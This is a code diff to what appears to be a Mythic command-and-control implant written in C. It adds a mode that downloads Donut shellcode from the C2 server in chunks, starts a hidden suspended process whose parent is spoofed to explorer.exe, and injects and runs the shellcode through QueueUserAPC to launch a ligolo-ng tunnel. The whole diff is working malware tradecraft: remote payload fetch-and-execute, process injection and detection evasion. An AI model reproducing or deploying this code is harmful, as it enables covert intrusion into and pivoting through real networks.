@@ -1,4 +1,4 @@
-#define _WIN32_WINNT 0x0600
+#define _WIN32_WINNT 0x0601
 #include "commands.h"
 #include "utils.h"
 #ifdef EVASION_SYSCALLS
@@ -11,10 +11,14 @@
 #include <windows.h>
 #include <tlhelp32.h>
 
-/* mingw may not define this at _WIN32_WINNT 0x0600 */
 #ifndef PROC_THREAD_ATTRIBUTE_MITIGATION_POLICY
 #define PROC_THREAD_ATTRIBUTE_MITIGATION_POLICY 0x00020007
 #endif
+#ifndef PROC_THREAD_ATTRIBUTE_PARENT_PROCESS
+#define PROC_THREAD_ATTRIBUTE_PARENT_PROCESS    0x00020000
+#endif
+
+#define LIGOLO_CHUNK_SIZE (512 * 1024)
 
 #if defined(INCLUDE_CMD_LIGOLO_START) || defined(INCLUDE_CMD_LIGOLO_STOP) || defined(INCLUDE_CMD_LIGOLO_STATUS)
 
@@ -31,6 +35,33 @@ typedef struct LigoloSession {
 } LigoloSession;
 
 static LigoloSession *g_sessions = NULL;
+
+static int ligolo_extract_int(const char *json, const char *key, int defval) {
+    char pat[64];
+    snprintf(pat, sizeof(pat), "\"%s\"", key);
+    const char *kp = strstr(json, pat);
+    if (!kp) return defval;
+    const char *vp = strchr(kp, ':');
+    if (!vp) return defval;
+    while (*++vp == ' ' || *vp == '\t');
+    return atoi(vp);
+}
+
+static char *ligolo_extract_b64(const char *json, const char *key) {
+    char pat[72];
+    snprintf(pat, sizeof(pat), "\"%s\":\"", key);
+    const char *start = strstr(json, pat);
+    if (!start) return NULL;
+    start += strlen(pat);
+    const char *end = strchr(start, '"');
+    if (!end) return NULL;
+    size_t len = (size_t)(end - start);
+    char *result = (char *)malloc(len + 1);
+    if (!result) return NULL;
+    memcpy(result, start, len);
+    result[len] = '\0';
+    return result;
+}
 
 static int ligolo_json_bool(const char *json, const char *key, int def) {
     char pat[64];
@@ -149,6 +180,8 @@ static void ligolo_impl(char *task_id, char *params, const char *action) {
     char bind_addr[256]          = {0};
     char proxy_url[512]          = {0};
     char user_agent[512]         = {0};
+    char shellcode_file_id[128]  = {0};
+    char ligolo_args[1024]       = {0};
     int  ignore_cert             = 1;
     int  retry                   = 1;
     int  verbose                 = 0;
@@ -159,12 +192,214 @@ static void ligolo_impl(char *task_id, char *params, const char *action) {
     extract_json_string(params, "bind",               bind_addr,          sizeof(bind_addr));
     extract_json_string(params, "proxy",              proxy_url,          sizeof(proxy_url));
     extract_json_string(params, "user_agent",         user_agent,         sizeof(user_agent));
+    extract_json_string(params, "shellcode_file_id",  shellcode_file_id,  sizeof(shellcode_file_id));
+    extract_json_string(params, "ligolo_args",        ligolo_args,        sizeof(ligolo_args));
     ignore_cert = ligolo_json_bool(params, "ignore_cert", 1);
     retry       = ligolo_json_bool(params, "retry",       1);
     verbose     = ligolo_json_bool(params, "verbose",     0);
 
     if (connect[0] == '\0' && bind_addr[0] == '\0') {
         send_task_response(task_id, "Error: -connect or -bind is required");
+        return;
+    }
+
+    /* --- FORK+RUN PATH --- */
+    if (shellcode_file_id[0]) {
+        /* Download Donut shellcode from Mythic in chunks (args already baked in by Python) */
+        unsigned char *shellcode     = NULL;
+        size_t         shellcode_len = 0;
+        int            total_chunks  = -1;
+        int            chunk_num     = 1;
+
+        while (1) {
+            char json_msg[1024];
+            snprintf(json_msg, sizeof(json_msg),
+                "{\"action\":\"post_response\",\"responses\":[{\"task_id\":\"%s\","
+                "\"upload\":{\"chunk_size\":%d,\"file_id\":\"%s\","
+                "\"chunk_num\":%d,\"full_path\":\"<ligolo_fork_run>\"}}]}",
+                task_id, LIGOLO_CHUNK_SIZE, shellcode_file_id, chunk_num);
+
+            char *b64_resp = send_c2_message(json_msg);
+            if (!b64_resp) { free(shellcode); send_task_response(task_id, "Error: C2 unreachable"); return; }
+
+            char *json_resp = process_mythic_response(b64_resp, strlen(b64_resp));
+            free(b64_resp);
+            if (!json_resp) { free(shellcode); send_task_response(task_id, "Error: decrypt failed"); return; }
+
+            if (chunk_num == 1) {
+                total_chunks = ligolo_extract_int(json_resp, "total_chunks", -1);
+                if (total_chunks <= 0) {
+                    free(json_resp); free(shellcode);
+                    send_task_response(task_id, "Error: failed to retrieve shellcode");
+                    return;
+                }
+            }
+
+            char *b64_chunk = ligolo_extract_b64(json_resp, "chunk_data");
+            free(json_resp);
+            if (!b64_chunk) { free(shellcode); send_task_response(task_id, "Error: missing chunk_data"); return; }
+
+            size_t         decoded_len = 0;
+            unsigned char *decoded     = base64_decode_bin(b64_chunk, strlen(b64_chunk), &decoded_len);
+            free(b64_chunk);
+
+            if (decoded && decoded_len > 0) {
+                unsigned char *tmp = realloc(shellcode, shellcode_len + decoded_len);
+                if (!tmp) { free(decoded); free(shellcode); send_task_response(task_id, "Error: out of memory"); return; }
+                shellcode = tmp;
+                memcpy(shellcode + shellcode_len, decoded, decoded_len);
+                shellcode_len += decoded_len;
+                free(decoded);
+            }
+
+            if (chunk_num >= total_chunks) break;
+            chunk_num++;
+        }
+
+        if (!shellcode || shellcode_len == 0) {
+            free(shellcode);
+            send_task_response(task_id, "Error: empty shellcode");
+            return;
+        }
+
+        /* Resolve host process path via SearchPathW (uses g_spawnto_path from spawnto command) */
+        wchar_t whost_name[512] = {0};
+        MultiByteToWideChar(CP_UTF8, 0, g_spawnto_path, -1, whost_name, 512);
+        wchar_t whost_full[512] = {0};
+        if (!strchr(g_spawnto_path, '\\') && !strchr(g_spawnto_path, '/')) {
+            DWORD ret = SearchPathW(NULL, whost_name, NULL, 512, whost_full, NULL);
+            if (ret == 0 || ret >= 512) {
+                SecureZeroMemory(shellcode, shellcode_len); free(shellcode);
+                char emsg[600];
+                snprintf(emsg, sizeof(emsg), "Error: '%s' not found in PATH", g_spawnto_path);
+                send_task_response(task_id, emsg);
+                return;
+            }
+        } else {
+            wcsncpy(whost_full, whost_name, 511);
+        }
+
+        /* PPID spoof: explorer.exe */
+        DWORD  spoof_pid2   = 0;
+        HANDLE hParent2     = NULL;
+        BOOL   use_spoof2   = FALSE;
+        LPPROC_THREAD_ATTRIBUTE_LIST attr2 = NULL;
+        {
+            HANDLE hSnap = CreateToolhelp32Snapshot(TH32CS_SNAPPROCESS, 0);
+            if (hSnap != INVALID_HANDLE_VALUE) {
+                PROCESSENTRY32 pe2; pe2.dwSize = sizeof(pe2);
+                if (Process32First(hSnap, &pe2)) do {
+                    if (_stricmp(pe2.szExeFile, "explorer.exe") == 0 && !spoof_pid2)
+                        spoof_pid2 = pe2.th32ProcessID;
+                } while (Process32Next(hSnap, &pe2));
+                CloseHandle(hSnap);
+            }
+        }
+        if (spoof_pid2)
+            hParent2 = OpenProcess(PROCESS_CREATE_PROCESS, FALSE, spoof_pid2);
+        if (hParent2) {
+            SIZE_T attr_size2 = 0;
+            InitializeProcThreadAttributeList(NULL, 1, 0, &attr_size2);
+            attr2 = (LPPROC_THREAD_ATTRIBUTE_LIST)HeapAlloc(GetProcessHeap(), 0, attr_size2);
+            if (attr2 && InitializeProcThreadAttributeList(attr2, 1, 0, &attr_size2)) {
+                if (UpdateProcThreadAttribute(attr2, 0, PROC_THREAD_ATTRIBUTE_PARENT_PROCESS,
+                                              &hParent2, sizeof(hParent2), NULL, NULL))
+                    use_spoof2 = TRUE;
+                else { DeleteProcThreadAttributeList(attr2); HeapFree(GetProcessHeap(), 0, attr2); attr2 = NULL; }
+            } else {
+                if (attr2) { HeapFree(GetProcessHeap(), 0, attr2); attr2 = NULL; }
+            }
+        }
+
+        STARTUPINFOEXW siex2;
+        ZeroMemory(&siex2, sizeof(siex2));
+        siex2.StartupInfo.cb          = use_spoof2 ? (DWORD)sizeof(siex2) : (DWORD)sizeof(STARTUPINFOW);
+        siex2.StartupInfo.dwFlags     = STARTF_USESHOWWINDOW;
+        siex2.StartupInfo.wShowWindow = SW_HIDE;
+        if (use_spoof2) siex2.lpAttributeList = attr2;
+
+        /* Build lpCommandLine: "{host_process_name} {ligolo_args}"
+         * The process sees this via GetCommandLineW(); ligolo-ng parses argv[1:]
+         * for its connection parameters (-connect, -ignore-cert, etc.). */
+        char cmdline_buf[2048] = {0};
+        snprintf(cmdline_buf, sizeof(cmdline_buf), "%s %s", g_spawnto_path, ligolo_args);
+        wchar_t wcmdline[2048] = {0};
+        MultiByteToWideChar(CP_UTF8, 0, cmdline_buf, -1, wcmdline, 2048);
+
+        PROCESS_INFORMATION pi2;
+        ZeroMemory(&pi2, sizeof(pi2));
+        DWORD cflags2 = CREATE_SUSPENDED | CREATE_NO_WINDOW;
+        if (use_spoof2) cflags2 |= EXTENDED_STARTUPINFO_PRESENT;
+
+        BOOL ok2 = CreateProcessW(whost_full, wcmdline, NULL, NULL, FALSE,
+                                  cflags2, NULL, NULL, &siex2.StartupInfo, &pi2);
+        if (use_spoof2) { DeleteProcThreadAttributeList(attr2); HeapFree(GetProcessHeap(), 0, attr2); }
+        if (hParent2) CloseHandle(hParent2);
+
+        if (!ok2) {
+            SecureZeroMemory(shellcode, shellcode_len); free(shellcode);
+            char emsg[256];
+            snprintf(emsg, sizeof(emsg), "Error: CreateProcess(%s) failed (%lu)", g_spawnto_path, GetLastError());
+            send_task_response(task_id, emsg);
+            return;
+        }
+
+        /* RW alloc -> write -> RX -> QueueUserAPC -> ResumeThread */
+        LPVOID rmem = VirtualAllocEx(pi2.hProcess, NULL, shellcode_len,
+                                     MEM_COMMIT | MEM_RESERVE, PAGE_READWRITE);
+        if (!rmem) {
+            TerminateProcess(pi2.hProcess, 0); CloseHandle(pi2.hThread); CloseHandle(pi2.hProcess);
+            SecureZeroMemory(shellcode, shellcode_len); free(shellcode);
+            send_task_response(task_id, "Error: VirtualAllocEx failed");
+            return;
+        }
+
+        SIZE_T written2 = 0;
+        if (!WriteProcessMemory(pi2.hProcess, rmem, shellcode, shellcode_len, &written2)
+                || written2 != shellcode_len) {
+            VirtualFreeEx(pi2.hProcess, rmem, 0, MEM_RELEASE);
+            TerminateProcess(pi2.hProcess, 0); CloseHandle(pi2.hThread); CloseHandle(pi2.hProcess);
+            SecureZeroMemory(shellcode, shellcode_len); free(shellcode);
+            send_task_response(task_id, "Error: WriteProcessMemory failed");
+            return;
+        }
+        SecureZeroMemory(shellcode, shellcode_len);
+        free(shellcode);
+
+        DWORD old_prot = 0;
+        VirtualProtectEx(pi2.hProcess, rmem, shellcode_len, PAGE_EXECUTE_READ, &old_prot);
+
+        if (!QueueUserAPC((PAPCFUNC)(ULONG_PTR)rmem, pi2.hThread, 0)) {
+            VirtualFreeEx(pi2.hProcess, rmem, 0, MEM_RELEASE);
+            TerminateProcess(pi2.hProcess, 0); CloseHandle(pi2.hThread); CloseHandle(pi2.hProcess);
+            char emsg[256];
+            snprintf(emsg, sizeof(emsg), "Error: QueueUserAPC failed (%lu)", GetLastError());
+            send_task_response(task_id, emsg);
+            return;
+        }
+        ResumeThread(pi2.hThread);
+
+        /* Track session using the host process handle */
+        LigoloSession *s2 = calloc(1, sizeof(LigoloSession));
+        if (!s2) {
+            TerminateProcess(pi2.hProcess, 0); CloseHandle(pi2.hThread); CloseHandle(pi2.hProcess);
+            send_task_response(task_id, "Error: out of memory");
+            return;
+        }
+        s2->hProcess = pi2.hProcess;
+        s2->pid      = pi2.dwProcessId;
+        WideCharToMultiByte(CP_UTF8, 0, whost_full, -1,
+                            s2->remote_path, sizeof(s2->remote_path), NULL, NULL);
+        strncpy(s2->connect, connect[0] ? connect : bind_addr, sizeof(s2->connect) - 1);
+        s2->next    = g_sessions;
+        g_sessions  = s2;
+        CloseHandle(pi2.hThread);
+
+        char msg2[512];
+        snprintf(msg2, sizeof(msg2),
+                 "Ligolo-ng fork+run: shellcode injected into %s (PID %lu)\nConnect: %s",
+                 g_spawnto_path, pi2.dwProcessId, connect[0] ? connect : bind_addr);
+        send_task_response(task_id, msg2);
         return;
     }
 
